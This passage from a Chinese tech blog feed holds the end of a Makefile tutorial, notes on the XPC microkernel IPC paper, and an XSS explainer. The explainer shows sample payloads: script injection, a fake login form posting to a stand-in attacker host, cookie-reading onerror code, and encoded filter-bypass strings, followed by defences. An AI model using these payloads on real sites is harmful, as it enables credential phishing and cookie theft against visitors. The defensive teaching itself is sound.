class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CC = gcc <span class="comment"># Flag for implicit rules</span></span><br><span class="line">CFLAGS = -g <span class="comment"># Flag for implicit rules. Turn on debug info</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用了隐晦规则 #1: blah 会使用默认的 linker 和 LDFLAGS 被链接</span></span><br><span class="line"><span class="comment"># 使用了隐晦规则 #2: 会自动生成一个名为 blah.o 的规则，使用默认 command，并依赖于 blah.c</span></span><br><span class="line"><span class="comment"># 使用了隐晦规则 #3: 编译时会使用 CFLAGS/CPPFLAGS 作为编译时 options</span></span><br><span class="line"><span class="section">blah: blah.o</span></span><br><span class="line"></span><br><span class="line"><span class="section">blah.c:</span></span><br><span class="line">    echo <span class="string">&quot;int main() &#123; return 0; &#125;&quot;</span> &gt; blah.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f blah*</span><br></pre></td></tr></table></figure><h2 id="Static-Pattern-Rules"><a href="#Static-Pattern-Rules" class="headerlink" title="Static Pattern Rules"></a>Static Pattern Rules</h2><p>有的时候，我想利用隐晦规则少写一点东西，但是我又不是在编译 C/C++ 程序（例如做汇编 / 管理其他语言的项目），怎么办？</p><p>你可以用这个语法：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">targets...: target-pattern: prereq-patterns ...</span></span><br><span class="line">   commands</span><br></pre></td></tr></table></figure><p>这相当于自己定义了一套规则，让所有匹配 <code>prereq-patterns</code> 的 dependencies 在执行 commands 后输出为 target-pattern。</p><blockquote><p>官方的说法是：</p><p>The essence is that the given <code>target</code> is matched by the <code>target-pattern</code> (via a <code>%</code> wildcard). Whatever was matched is called the <em>stem</em>. The stem is then substituted into the <code>prereq-pattern</code>, to generate the target’s prereqs.</p><p>其本质是，给定的 <code>target</code> 与 <code>target-pattern</code>（通过 <code>%</code> 通配符）相匹配。匹配到的内容称为 <em>stem</em>。然后，将 stem 替换为<code>prereq-pattern</code>，生成 <code>target</code> 的 dependencies。</p></blockquote><p>例如，如果我不想编译 C/C++ 程序，只是想汇编一批文件，那么可以这么做：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AS=$&#123;CC&#125; -c</span><br><span class="line">deps = main.o print.o print_hex.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把 target 中需要的所有 *.o 的名字对应到 *.s 的依赖上</span></span><br><span class="line"><span class="section">$&#123;deps&#125;: %.o: %.s</span></span><br><span class="line">    $&#123;AS&#125; -o <span class="variable">$@</span> <span class="variable">$^</span></span><br></pre></td></tr></table></figure><h2 id="More…"><a href="#More…" class="headerlink" title="More… ?"></a>More… ?</h2><p>好了，上面的用法已经能涵盖 90% 的 Makefile 的用途了</p><p>如果你还希望更详细、更“刁钻” 的用法，就应该去查官方文档啦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;说来惭愧，之前笔者还认为 Makefile 这种工具已经过时，只需要学 CMake 就行。&lt;/p&gt;
&lt;p&gt;但最近在写 boot loader 时遇到了一些问题：我既不是在编译可执行文件，也不是在编译库，这样 CMake 就显得比较无力了，因为总是用 &lt;code&gt;add_cu</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="GNU" scheme="https://blog.sjtuxhw.top/tags/GNU/"/>
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="make" scheme="https://blog.sjtuxhw.top/tags/make/"/>
    
  </entry>
  
  <entry>
    <title>XSS 是什么？</title>
    <link href="https://blog.sjtuxhw.top/technical/xss/"/>
    <id>https://blog.sjtuxhw.top/technical/xss/</id>
    <published>2024-10-04T04:15:33.000Z</published>
    <updated>2024-10-31T04:54:40.793Z</updated>
    
    <content type="html"><![CDATA[<p>最近一个同学和我讨论一个问题，说到了 XSS 跨站攻击，我恰好对这块不是很熟，于是整理一下相关的资料，希望在编写互联网应用的时候多加注意。</p><p>同时，笔者会讨论具体的防护措施，希望大家都不会受到此类攻击的困扰。注意，下文涉及的技术细节仅供学习之用。</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Cross Site Scripting (XSS) attacks 是一类代码注入攻击。攻击者利用了互联网应用的安全漏洞将恶意代码（通常是浏览器端脚本）插入正常可信的网站，甚至篡改网页内容。由于其他终端用户的浏览器认为脚本来自可信网站，因此直接执行，最终所有 cookies/session tokens 或其他敏感信息悉数被窃取，从而达到攻击其他终端用户（其他访问者）的目的。</p><p>而让这些攻击成为可能的 “安全漏洞”，或者说缺陷，在互联网应用中广泛存在，尤其是对前端接受用户输入的部分不做检查和编码的情况下。</p><h2 id="Mechanisms"><a href="#Mechanisms" class="headerlink" title="Mechanisms"></a>Mechanisms</h2><p>XSS 的攻击方式是怎样的？通常它有以下两个步骤：</p><ol><li>数据通过不受信任的来源（最常见的是 Web 请求）进入 Web 应用程序；</li><li>可能存在恶意代码的数据包含在动态内容中发送给 Web 用户；</li></ol><p>也就是说，只要浏览器引擎可以执行的代码（一段 JavaScript，HTML，Flash 代码等等），攻击者都可以发送并让受害者执行。</p><p>XSS 攻击主要分为两类：</p><ul><li><p>Reflected XSS Attacks：顾名思义，就是指注入的脚本从 Web  服务器反射回来。</p><p>例如攻击者注入的脚本利用应用特性（例如不严谨的输入校验）嵌入在错误消息、搜索结果或任何其他响应，以链接 / 特制表单等形式传递给受害者。</p><p>当用户被诱骗点击恶意链接、提交特制表单，甚至只是浏览易受攻击的网站时，注入的代码就会传输到该网站，从而将攻击反射回用户的浏览器。然后浏览器执行代码，因为它来自“可信”服务器。Reflected XSS 有时也称为 Non-Persistent 或者 Type-I XSS（攻击通过单个请求/响应周期进行）。</p></li><li><p>Stored XSS Attacks：是指注入的脚本永久存储在目标服务器上，例如数据库、消息论坛、访问者日志、评论字段（其中评论和数据库最为常见）等。然后，受害者在请求存储的脚本时从服务器检索恶意脚本。Stored XSS 有时也称为 Persistent 或者 Type-II XSS。</p></li><li><p>（不常见）DOM-Based XSS Attacks：</p></li></ul><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>再次重申，你不应该用这些手段去作出不当的行为，这里的内容仅供学习之用。</p><p>以 Reflected XSS Attack 为例。假设一个网站后端是 PHP 书写的，有个搜索的接口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://my.project.com/a_form.html?search=stocks</span><br></pre></td></tr></table></figure><p>简化版的 PHP（危险之处是这个程序不经检查直接将有问题的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#x27;You Searched: &#x27; . $_GET[&quot;search&quot;]; ?&gt;</span><br></pre></td></tr></table></figure><p>如果攻击者不好好搜索正常的字符，而是搜索 <code>&lt;script&gt;alert(&#39;malicious code here&#39;);&lt;/script&gt;</code> 怎么办？</p><p>这样浏览器会接受到完整的 JavaScript 内联标签并执行其中的代码。</p><p>例如攻击者可以将修改后的链接传播给不知情的用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://my.project.com/a_form.html?search=&lt;script&gt;alert(&#x27;malicious code here&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果代码中的是攻击者精心设计的有害代码，那么后果不堪设想。</p><p>再以 Stored XSS Attack 为例，假设有一个技术论坛的留言系统，没有任何输入检查措施，直接储存在数据库中，并将数据渲染在页面上。</p><p>那么攻击者可以写一段伪装的登录表单作为评论：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 表单将数据发送给攻击者的网站 example.malicious.com --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;example.malicious.com&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">legend</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your name&quot;</span> <span class="attr">required</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">id</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">placeholder</span>=<span class="string">&quot;Enter your password&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">required</span></span></span><br><span class="line"><span class="tag">          /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send&quot;</span> <span class="attr">class</span>=<span class="string">&quot;submit-btn&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么在评论区就会出现一个可以交互的表单。如果攻击者用 CSS 或其他手段将这个表单包装起来，引诱用户输入信息，那么后果也很严重。</p><p>如果这个评论系统一直保留这个 vulnerability，那么这种方式轻则给该网站注入牛皮癣广告，重则严重泄漏用户信息。</p><p>当然，攻击者除了明目张胆使用上面的入侵代码，还可以：</p><ul><li><p>故意写一个不存在的图片引用，让 <code>onerror</code> 执行恶意代码：<code>&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&gt;</code>；</p></li><li><p>使用 URI encoded 表示方法绕过安全检查：<code>&lt;IMG SRC=j&amp;#X41vascript:alert(&#39;test2&#39;)&gt;</code>（注：UTF-8 中 <code>a=&amp;\#X41</code> ）；</p></li><li><p>使用 base64 加密并放在 <code>META</code> tag 中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">CONTENT</span>=<span class="string">&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>……</p></li></ul><h2 id="Consequences"><a href="#Consequences" class="headerlink" title="Consequences"></a>Consequences</h2><p>无论是 stored 还是 reflected （或者是 DOM-based），XSS  攻击的后果都是相同的。它们的不同之处在于 effective payload 到达服务器的方式。</p><p>不要误以为 “只读” 的网站不易受到严重的反射型 XSS 攻击。XSS 带来的问题包括但不仅限于：</p><ul><li>帐户信息、Session Cookies 泄露、账户劫持；</li><li>泄漏用户文件、安装木马程序；</li><li>舆论上：允许攻击者修改新闻稿或新闻项目的 XSS 漏洞可能会影响公司的股价或削弱消费者的信心。</li><li>……</li></ul><h2 id="互联网应用开发者应该如何防护"><a href="#互联网应用开发者应该如何防护" class="headerlink" title="互联网应用开发者应该如何防护"></a>互联网应用开发者应该如何防护</h2><p>幸运的是，大多数现代的互联网应用程序前端框架都有防护 XSS 攻击的基本能力。</p><ul><li>React 默认情况下不允许使用 inner HTML；</li><li>React 默认情况不允许解析 <code>javascript:</code> 或 <code>data:</code> 开头的 URLs；</li><li>Angular 存在代码执行安全校验；</li><li>Polymer 默认不使用 HTML literal；</li><li>……</li></ul><p>所以开发者在前端应该：</p><ul><li>不使用 React 标注危险的 <code>dangerouslySetInnerHTML</code> 元素属性；</li><li>不使用 Angular <code>bypassSecurityTrustAs*</code> 这类函数；</li><li>尽量不使用 Polymer 的 <code>inner-h-t-m-l</code> 属性和 <code>htmlLiteral</code> 函数；</li><li>不使用过时的、被报告有缺陷的框架，及时更新；</li><li>自己不借助框架手写的话一定要注意测试此类问题，例如：<ul><li>积极使用 <code>DOMPurify</code> 来进行 HTML Sanitization，处理输入；</li><li>使用更安全的 HTML 属性，例如：<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#safe-sinks">SAFE SINKS</a>；</li></ul></li><li>等等；</li></ul><h2 id="用户应该如何防护"><a href="#用户应该如何防护" class="headerlink" title="用户应该如何防护"></a>用户应该如何防护</h2><ul><li>不点击来源不明的链接；</li><li>不访问浏览器 / 安全软件明确提示危险的不可信网页；</li><li>不在不清楚安全性的网站上填写隐私信息；</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近一个同学和我讨论一个问题，说到了 XSS 跨站攻击，我恰好对这块不是很熟，于是整理一下相关的资料，希望在编写互联网应用的时候多加注意。&lt;/p&gt;
&lt;p&gt;同时，笔者会讨论具体的防护措施，希望大家都不会受到此类攻击的困扰。注意，下文涉及的技术细节仅供学习之用。&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Web" scheme="https://blog.sjtuxhw.top/tags/Web/"/>
    
    <category term="Security" scheme="https://blog.sjtuxhw.top/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>论文阅读 - XPC: Architectural Support for Secure and Efficient Cross Process Call</title>
    <link href="https://blog.sjtuxhw.top/technical/xpc-paper/"/>
    <id>https://blog.sjtuxhw.top/technical/xpc-paper/</id>
    <published>2024-09-28T13:46:00.000Z</published>
    <updated>2024-10-31T02:26:18.113Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇 2019 年的关于微内核 IPC 性能优化的文章。</p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>微内核有很多引人注目的 features，例如 安全性、容错性、模块化，以及可定制性，这些特性近期在学术界和工业界又再次掀起了一股研究热潮（including seL4, QNX and Google’s Fuchsia OS）。</p><blockquote><p>Google’s Fuchsia’s kernel (called Zircon)</p></blockquote><p>但是 IPC（进程间通信）作为微内核的 阿喀琉斯之踵，仍然是导致微内核 OS 总体性能较低的主要因素之一。同时 IPC 在宏内核中也扮演者很重要的角色，例如 Android Linux，其中的移动端程序会经常和用户态服务通过 IPC 通信。所以优化 IPC 自然是一个很重要的课题。</p><p>之前学界对 IPC 在软件层面的优化都绕不开 Kernel，因为 IPC 在这方面的主要开销就是 域切换（domain switch）和消息复制/重映射（message copying/remapping）；在硬件层面的优化方法主要是 给内存和能力打 tag，为了隔离而替换页表。但这类修改通常需要对现有的软件栈进行相当多的修改来适应新的 OS 原语。</p><p>这篇文章主要是提出一种硬件协同的操作系统原语——也就是 XPC（Cross Process Call），提供一种高速安全的 IPC 的实现。</p><p>XPC 的主要特征是：</p><ul><li>允许在 XPC caller 和 callee 间直接切换，中途不需要陷入 Kernel；</li><li>允许消息在不同进程的调用链中传递，无需 copy；</li></ul><p>XPC 还有个优点是，这个原语本身是与传统的 “基于地址的隔离机制” 相兼容的，能比较轻松地整合到现有的微内核或者宏内核中。</p><p>所以笔者就就介绍了基于 Rocket RISC-V 核心、搭载 RPGA 的板子上实现了 XPC 的原型，并且移植到两个主流的微内核系统 seL4 和 Ziron 上、一个宏内核的 Android Binder 上以便进行评估测试、GEM5 模拟器上来验证通用性。</p><p>结果发现 XPC 能显著提升 IPC 调用的性能，Android Binder 上提升 54.2 倍，对于在微内核上跑的真实应用（sqlite/ HTTP Server）也有相当大的速度提升。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="1-问题分析"><a href="#1-问题分析" class="headerlink" title="1. 问题分析"></a>1. 问题分析</h3><ul><li><p>（微内核特征）微内核已经被详尽地研究多年了：</p><ul><li><p>最小化在特权级中执行的功能，把一些 paging、fs、设备驱动之类的组件放到用户态中，这样能实现 细粒度的隔离、更高的可扩展性、安全和容错性；</p><p>这种基于微内核的操作系统已经被广泛应用到诸如移动基站、飞行器和交通工具中；</p></li></ul></li><li><p>（微内核问题）但当前设计基于微内核的 OS 仍然面临安全和性能之间权衡的问题：</p><ul><li>更细粒度的隔离会提升系统的安全性和容错性，但是会导致 IPC 次数增多；</li></ul></li><li><p>（宏内核也面临同样的问题）对于宏内核的 OS 也存在 IPC 性能不佳的问题，针对这个问题，Android 向 Linux Kernel 中引入了 Binder 以及 Anonymous Shared Memory 来缓解这个问题，但这个开销仍然很大。</p><blockquote><p>像 Android 基于宏内核的 Linux 构建，会给移动应用程序提供一些用户态的服务，然后应用程序会频繁地调用这些服务，像是利用窗口管理器在屏幕上绘制组件，等等，开销比较大。</p></blockquote></li></ul><p>可以分析出来，IPC 的主要两个性能瓶颈在于 domain switch 以及 message copy：</p><ul><li><p>因为 caller 和 callee 分别位于用户态的两个进程，二者要发生调用的话就需要通过中断进入内核，然后切换内存地址空间，包括 Context saving/restoring、功能和权限的检查以及其他的 IPC 逻辑，一来一回的开销就不小。</p></li><li><p>此外，两个进程间因为存在虚拟内存的隔离机制，两者间传递消息就需要一些特殊手段，常见的方法是类似于 mmap 一样，分配一个共享内存，在这段共享内存中放置消息就能实现近乎 0 copy 的消息传递。</p><blockquote><p>但需要注意的是，如果 caller 和 callee 同时持有这块共享内存的话，可能会引起 <code>TOCTTOU</code>（Time Of Check To Time Of Use）攻击。</p><p><a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">TOCTTOU Details</a>；</p><p>这个问题可以通过重新映射页表的权限信息（所有权转移）来缓解，但更改页表又会涉及 Kernel 的操作，不仅无法避免用户态和内核态的切换，而且会间接造成 TLB 击穿；</p></blockquote></li></ul><p>总结下来就是，在之前众多软件解决方案中，进程切换陷入内核的开销无法避免，而且消息传递要么需要多次 copy，要么会导致 TLB 击穿；在之前的硬件解决方案中，14 年的论文提出 CODOMs（Code-centric Memory Domains）的系统架构，充分利用标记内存，而非更改页表的方式达到隔离效果，起到减少 domain switch 次数、提升消息传递效率的效果。</p><p>但这样的一个新的硬件层面的解决方案可能需要现有的使用多套内存地址的 kernel 的实现进行比较大的变动。</p><p>所以这篇文章就想提出一种新型的硬件协同的 OS 原语 XPC，实现更高效更安全的 IPC 调用，完成以下目标：</p><ul><li>（减小开销 1）让 IPC 在 caller 和 callee 间直接切换，不需要频繁陷入 kernel；</li><li>（减小开销 2）以更安全的 0 copy 的方式在 caller 和 callee 间传递数据；</li><li>（软件改动小）更轻松的集成到现有的 kernel 中，而无需很大的改动；</li><li>（硬件改动小）最小的硬件改动；</li></ul><h3 id="2-构思方案"><a href="#2-构思方案" class="headerlink" title="2. 构思方案"></a>2. 构思方案</h3><p>本文要实现的原语主要分为 3 个部分：</p><ul><li><p>创建硬件层面可感知的抽象 <code>x-entry</code>，定义新能力 <code>xcall-cap</code>：<code>x-entry</code> 中包含一个 ID，<code>xcall-cap</code> 是一个用于访问控制的新能力；</p><p>这个能力由 Kernel 管理（flexibility），并交由硬件来校验（efficiency）；</p></li><li><p>创建一组新指令，包括 <code>xcall</code>、<code>xret</code>，来让用户态的代码直接 switch 到另一个进程，而无需内核的参与；</p></li><li><p>创建一套新的内存地址空间映射机制，称为 <code>relay-seg</code>（relay memory segment，中继内存段），用来为 caller 和 callee 间做 0-copy 消息传递提供空间；</p><p>这个映射关系将存放在一个新的寄存器中，用来标识存放消息所对应的虚拟内存和物理内存的基地址以及范围；</p><ul><li><strong>这套机制能够控制共享内存的所有权转移，不仅规避了 domain switch 及其引起的 TLB 击穿带来的性能问题，而且缓解了 TOCTTOU 风险。</strong></li><li>与此同时，<code>relay-seg</code> 本身也可以通过调用链传递，称为 <code>handover</code>，也能进一步降低 copy 的次数，提升性能；</li></ul><blockquote><p>三点好处：0-copy、page-free 的所有权转移、实现 handover；</p></blockquote></li></ul><p>此外，XPC 会选用同步的 IPC 实现方式。尽管异步的 IPC 有更高的吞吐量，但同步 IPC 可以达到更低的时延，并且在 POSIX API 下更容易实现它的语义。</p><blockquote><p>即便 Google 的 Zircon 用的是异步 IPC，但它也是用异步 IPC 模拟文件系统接口的同步语义。这就造成了每次 IPC 比较大的时延。</p></blockquote><p>不仅如此，XPC 克服了传统同步 IPC 的两个限制：</p><ul><li><p>相对低下的数据传输效率（<strong>XPC 用 <code>relay-seg</code> 解决</strong>）；</p></li><li><p>对多线程应用不友好的编程模型（XPC 提供 migrating thread model 模式的编程接口，1994 Bryan Ford）；</p><blockquote><p>参见 Notes on Thread Models in Mach 3.0</p></blockquote></li></ul><p>XPC 的移植情况：</p><ul><li>Rocket RISC-V core on FPGA board（for evaluation）；</li><li>2 Micro-kernel Implementation（seL4 &amp; Zircon）；</li><li>1 Monolithic kernel Implementation（Android Binder）；</li></ul><blockquote><p>Measured: micro-benchmark &amp; real-world applications；</p></blockquote><h3 id="3-论文贡献"><a href="#3-论文贡献" class="headerlink" title="3. 论文贡献"></a>3. 论文贡献</h3><p>总的来说，这篇文章作出了如下的成果：</p><ul><li>详细分析了 IPC 的性能开销，并且对比了当今常见的几种优化方式；</li><li>提出了一种新的 OS 原语，不借助 kernel trapping，沿着调用链的 0-copy 消息传递；</li><li>Implementation……</li><li>An evaluation on micro-benchmark &amp; real-world platform；</li></ul><h2 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h2><ul><li><p>IPC 的性能仍然很重要：</p><ul><li>使用前沿 microkernel（seL4）分析性能，在运行 sqlite3 的 seL4 的 RISC-V 板子上测试 YCSB benchmark，发现在这个 workload 下有 18%-39% 的时间都在 IPC；</li><li>在消息量很短的情况下，性能瓶颈位于 domain switch；随着 IPC 消息量增大，性能瓶颈趋向于 message transfer；</li></ul><p>这个性能测试激励笔者设计 XPC 时兼顾快速的 domain switch 和高效的消息传递两个因素；</p></li><li><p>拆开 IPC，详细分析其中各个步骤的性能瓶颈，同样使用 mirco-kernel seL4 &amp; RISC-V board with FPGA；</p><ul><li><p>fast path（聚焦）：自然是不存在其他中断和调度的情况，只有 trap（syscall）、IPC 逻辑、Process Switch、Restore、Message Transfer；</p><ul><li><p><strong>Trap &amp; Restore</strong>:</p><ul><li>过程：syscall -&gt; context switch -&gt; […] -&gt; restore callee’s context -&gt; callee user space（domain switch 的两大重要开销）；</li></ul><blockquote><p>一般情况下，这个 domain switch 的开销不可避免（caller &amp; callee 互不信任）；</p><p><strong><u>设想</u></strong>：但是某些情况下 caller 和 callee 可以自定义 calling conventions，让它们自己管理 context 就能在 isolation 和 performance 间找到最佳平衡；</p></blockquote></li><li><p>IPC Logic: <strong><u>CHECKING</u></strong>！</p><blockquote><p>seL4 使用 capabilities 管理 kernel 资源，包括 IPC：</p><p>kernel 找到 caller 的 capability &amp; 检查有效性</p><p>-&gt; 然后检查以下条件，来确定是否发生调度：</p><ul><li>caller / callee 有不同优先级？</li><li>caller / callee 不在一个核上？</li><li>message 大小大于寄存器（32 bytes）但小于 IPC buffer size（120 bytes）；</li></ul><p>以上满足一项，就调度到其他进程（slow path）</p></blockquote><p><strong><u>设想</u></strong>：这些检测步骤可以由硬件完成，通过并行化来缓解时延问题。此外，这步启发我们将这个 checking 逻辑分为 control plane（软件 -&gt; flexibility）和 data plane（硬件 -&gt; efficiency），<strong>回想 <code>xcall-cap</code> 能力</strong>；</p></li><li><p>Process Switch:</p><ul><li>4 步过程：dequeue callee &amp; block caller -&gt; add <code>reply_cap</code> into callee thread -&gt; kernel 传送小于一个寄存器大小的消息 -&gt; switch to callee’s user space address；</li><li>存在内存访问，cache miss / TLB miss 会影响本部分性能；</li></ul></li><li><p>Message Transfer：</p><ul><li>一个寄存器大小以内的，上面 process switch 时传递（short path）；</li><li>大于一个寄存器大小、小于 IPC buffer size 的，进入 slow path（interrupt &amp; schedule）来传输数据；</li><li>大于 IPC buffer size 的，seL4 会使用位于用户态的 shared memory 来减少 copy；</li></ul><p>但是最后一种情况使用 shared memory 确实不安全：多线程的 caller 可以观察 callee 的操作，并且能通过修改共享内存信息，从而影响 callee 行为；并且在大部分实现中，数据还是要先 copy 到共享内存中去。所以大数据量下 message transfer 仍然是开销大头；</p></li></ul></li><li><p>slow path：会考虑到现实情况下，可能存在 OS 的其他中断以及进程调度；</p></li></ul></li></ul><p>基于上述分析，观察到两点：</p><ol><li>一个快速的 IPC 需要不经过 Kernel 的参与，但现在还没实现；</li><li>在传输消息时，安全、快速的 0-copy 机制对于 IPC 性能是很重要的，尤其是大数据量的情况；</li></ol><p>根据这两点，笔者设计了 XPC 的总体框架：</p><h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><h3 id="总体概览"><a href="#总体概览" class="headerlink" title="总体概览"></a>总体概览</h3><p><img src="imgs/xpc-engine.png" /></p><p>XPC Engine 提供 <code>x-entry</code> &amp; <code>xcall-cap</code> 两个抽象。规则如下：</p><ul><li>一个进程可以创建多个 <code>x-entries</code>；所有的 entries 都会存放在 <code>x-entry-table</code> 中，并且每个 entry 有一个 ID（就是 table index）；</li><li>table 本身存放在全局的 memory 中，有一个寄存器 <code>x-entry-table-reg</code> 存放表基地址，<code>x-entry-table-size</code> 控制表长；</li><li>一个 caller 需要 <code>xcall-cap</code> 这个能力来 invoke 一个 <code>x-entry</code>。<code>xcall-cap</code> 描述了对每个 <code>x-entry</code> 能否 invoke 的能力；</li><li><code>xcall #reg</code> 和 <code>xret</code> 控制进行 XPC 调用的两条指令，<code>#reg</code> 是 kernel 提供的具体 <code>x-entry</code> 的 index，对应 Kernel 管理的 <code>xcall-cap-reg</code> 内的能力（里面可以 check）；</li></ul><p>XPC 进行轻量的信息 copy 的 <code>relay-seg</code> 规则如下：</p><ul><li>relay memory segment 位于一段连续的物理内存上，不由页表管理，只有 <code>seg-reg</code> 寄存器承担 VM 翻译工作（里面存放虚拟内存和物理内存基地址，以及区域长度和权限信息，相当于全能版 PTE）；</li><li>OS Kernel 会确保这片区域不会和分配的普通页表 overlap；</li></ul><blockquote><p>这样修改区域权限的时候就能绕开页表，避免 TLB 击穿；</p></blockquote><h3 id="XPC-Engine"><a href="#XPC-Engine" class="headerlink" title="XPC Engine"></a>XPC Engine</h3><p>执行 <code>xcall #reg</code> 时，XPC Engine 完成以下任务：</p><ol><li><p>读取 <code>#reg</code> index，按 <code>xcall-cap-reg</code>（可以是 general purpose register）指向的存放 bitmap 的内存区域校验 caller 的能力（细节见下文）；</p></li><li><p>从 <code>x-entry-table</code> 读取对应的 <code>x-entry</code>，检查这个 entry 是否有效；</p></li><li><p>向 link stack 表（kernel space）中推入一条记录，保存返回时的必要信息。其中 link stack 在每个线程中都有；</p><blockquote><p>类似普通 <code>call / ret</code> 指令需要操作 <code>%rsp</code> 来在栈上保存 return address、类似 system call 会用 <code>%rcx / %r11</code> 保存 <code>rflags</code> 和 $I_{next}$，这里新的 <code>xcall / xret</code> 就需要一个返回时必要信息，这里称 linkage record；</p></blockquote></li><li><p>CPU 切换 Page Table（CR3），flush TLB，设置 PC 为 callee 进程的 procedure 入口地址。最后还会把 caller 的 <code>xcall-cap-reg</code> 放到寄存器中（RISC-V 中用的是 <code>t0</code>），让 callee 知道关于 caller 的信息；</p><blockquote><p>这相当于 “精简版” 的 context switch。但这样会有问题吗？细节见下文；</p></blockquote></li></ol><p>虽然没有真正涉及到 kernel（domain switch），但如果出现 exception 还是会 report 给 kernel 来决定；</p><p>执行 <code>xret</code> 时，XPC Engine 通过弹出 link stack 中的一条记录，检验 valid 并完成一次简单的 switch 来回到 caller 所在进程；</p><p>那么 <code>xcall-cap</code> 是如何管理、<code>xcall #reg</code> 指令是如何校验 caller 的能力的呢？原来：</p><ul><li>每个线程就有一块内存空间，起始地址存放在 <code>xcall-cap-reg</code> 中，也是由 Kernel 管理；这块内存空间就是一片 bitmap，第 i bit 是 1 就表示该线程有能力 invoke ID 为 i（也就是在 <code>xcall-table</code> 中 index=i）的 <code>x-entry</code>；</li></ul><p>就和之前说的一样，这里由 Kernel 管理，由硬件校验；</p><p>还有一点是 link 